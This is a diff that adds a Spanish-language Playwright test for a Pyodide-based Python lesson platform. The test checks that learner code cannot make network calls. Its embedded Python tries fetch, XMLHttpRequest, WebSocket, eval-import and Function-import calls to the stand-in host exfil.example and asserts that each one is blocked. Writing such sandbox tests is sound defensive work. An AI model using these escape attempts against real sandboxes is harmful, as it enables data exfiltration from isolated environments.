@@ -106,3 +106,37 @@ test("el registro rechaza una contraseña de las más usadas y explica por qué"
   await expect(page.locator("#account-dialog")).toContainText("de las más usadas");
   await expect(page.locator("#account-label")).toHaveText("Iniciar sesión");
 });
+
+test("el código Python del alumno no puede enviar datos a otros servidores (PLD-SEC-004)", async ({ page, context }) => {
+  // La CSP del <meta> no llega al Worker de Pyodide: el Worker cierra su red antes de ejecutar código
+  const hits = [];
+  await context.route("https://exfil.example/**", (route) => {
+    hits.push(route.request().url());
+    return route.fulfill({ status: 200, body: "ok", headers: { "access-control-allow-origin": "*" } });
+  });
+  await openLesson(page, "variables");
+  const code = [
+    "import js",
+    "intentos = {",
+    "    'fetch': lambda: js.fetch('https://exfil.example/fetch'),",
+    "    'xhr': lambda: js.XMLHttpRequest.new(),",
+    "    'websocket': lambda: js.WebSocket.new('wss://exfil.example/ws'),",
+    "    'eval': lambda: js.eval(\"import('https://exfil.example/eval.js')\"),",
+    "    'Function': lambda: js.Function(\"return import('https://exfil.example/fn.js')\")(),",
+    "}",
+    "for nombre, intento in intentos.items():",
+    "    try:",
+    "        intento()",
+    "        print(nombre, 'permitido')",
+    "    except Exception:",
+    "        print(nombre, 'bloqueado')",
+    "print('Python sigue funcionando', 2 + 2)",
+  ].join("\n");
+  await page.locator("#console-editor").fill(code);
+  await page.locator("#console-run").click();
+  const output = page.locator("#console-output");
+  await expect(output).toContainText("Python sigue funcionando 4", { timeout: 90_000 });
+  for (const name of ["fetch", "xhr", "websocket", "eval", "Function"]) await expect(output).toContainText(`${name} bloqueado`);
+  await page.waitForTimeout(500);
+  expect(hits).toEqual([]);
+});
